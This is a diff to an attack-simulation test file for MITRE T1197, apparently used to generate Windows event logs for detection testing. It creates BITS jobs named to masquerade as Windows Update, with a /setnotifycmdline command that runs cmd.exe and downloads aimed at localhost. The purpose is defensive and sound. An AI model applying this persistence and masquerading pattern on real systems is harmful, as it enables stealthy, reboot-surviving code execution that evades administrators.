@@ -1,32 +1,49 @@
 id: T1197
 name: BITS Jobs Persistence
-description: Creates a Background Intelligent Transfer Service (BITS) job for persistence or tool download, simulating a stealthy attacker persistence mechanism. Generates Sysmon Event 22 (DNS query) and custom BITS events in the Microsoft-Windows-Bits-Client/Operational log.
+description: Creates BITS jobs using bitsadmin /setnotifycmdline (the canonical persistence technique — no legitimate Windows Update job uses this) and Start-BitsTransfer. Job names masquerade as Windows Update. Generates BITS Client EID 59/60/61 (job URL and destination logged) and Sysmon EID 1 for bitsadmin.exe with /setnotifycmdline argument.
 tactic: persistence
 technique_id: T1197
 platform: windows
 phase: attack
 elevation_required: false
 expected_events:
-  - "Microsoft-Windows-Bits-Client EventID 3 (BITS job created)"
-  - "Microsoft-Windows-Bits-Client EventID 59 (BITS transfer started)"
-  - "4688 (bitsadmin.exe process creation)"
-  - "Sysmon 1 (bitsadmin.exe with /create or /transfer arguments)"
+  - "Sysmon 1 (bitsadmin.exe with /setnotifycmdline argument — high-signal indicator)"
+  - "Microsoft-Windows-Bits-Client EID 59 (BITS transfer job started — URL + destination logged)"
+  - "Microsoft-Windows-Bits-Client EID 60 (BITS transfer stopped)"
+  - "Sysmon 3 (network connection from svchost.exe — BITS service reaching out)"
 tags:
   - persistence
-  - defense-evasion
   - no-prereqs
 executor:
-  type: cmd
-  command: |
-    echo [T1197] BITS Jobs Persistence - simulating BITS-based persistence
-    echo --- Creating BITS job (generates BITS-Client Event 3) ---
-    bitsadmin /create LogNoJutsu_BITS_Test
-    bitsadmin /list /allusers 2>nul
-    echo --- Setting BITS job notify command (persistence mechanism) ---
-    bitsadmin /setnotifycmdline LogNoJutsu_BITS_Test "cmd.exe" "/C echo LogNoJutsu-BITS-Persistence-Simulation"
-    echo --- Listing BITS job details ---
-    bitsadmin /info LogNoJutsu_BITS_Test 2>nul
-    echo [T1197] Complete. BITS job created. Check Microsoft-Windows-Bits-Client/Operational log.
-cleanup: |
-  bitsadmin /cancel LogNoJutsu_BITS_Test 2>$null
-  Write-Host "Cleanup: BITS job 'LogNoJutsu_BITS_Test' cancelled."
+  type: powershell
+  command: |-
+    Write-Host "[T1197] BITS Jobs Persistence — bitsadmin /setnotifycmdline pattern"
+
+    # Method 1: bitsadmin /setnotifycmdline — the canonical BITS persistence technique
+    # /setnotifycmdline executes a command on job completion/error — survives reboots
+    # Job name masquerades as Windows Update (common attacker naming)
+    Write-Host "--- Method 1: bitsadmin /setnotifycmdline (EID 59 + Sysmon 1 for /setnotifycmdline) ---"
+    $jobName = "MicrosoftWindowsUpdate"
+    bitsadmin /create $jobName 2>&1 | Write-Host
+    bitsadmin /addfile $jobName "http://127.0.0.1:19999/nonexistent.exe" "$env:TEMP\lnj_bits.exe" 2>&1 | Write-Host
+    bitsadmin /setnotifycmdline $jobName "cmd.exe" "/c whoami > `"$env:TEMP\lnj_bits_out.txt`"" 2>&1 | Write-Host
+    bitsadmin /resume $jobName 2>&1 | Write-Host
+    Start-Sleep -Seconds 3
+    bitsadmin /list /allusers 2>&1 | Write-Host
+
+    # Method 2: PowerShell Start-BitsTransfer (generates Microsoft-Windows-Bits-Client events)
+    Write-Host "--- Method 2: Start-BitsTransfer async (BITS Client EID 59/61) ---"
+    Import-Module BitsTransfer -ErrorAction SilentlyContinue
+    $bitsJob = Start-BitsTransfer -Source "http://127.0.0.1:19999/nonexistent" `
+        -Destination "$env:TEMP\lnj_bits_dl.exe" -Asynchronous `
+        -ErrorAction SilentlyContinue -DisplayName "Windows Update Agent"
+    if ($bitsJob) {
+        Get-BitsTransfer | Select-Object JobId, DisplayName, JobState | Format-Table
+    }
+
+    Write-Host "[T1197] Complete. Check BITS-Client/Operational EID 59 (URL logged) and Sysmon EID 1 bitsadmin."
+cleanup: |-
+  bitsadmin /cancel "MicrosoftWindowsUpdate" 2>&1 | Out-Null
+  Get-BitsTransfer -ErrorAction SilentlyContinue | Remove-BitsTransfer -ErrorAction Ignore
+  Remove-Item "$env:TEMP\lnj_bits*" -ErrorAction Ignore
+  Write-Host "Cleanup: BITS jobs and files removed."
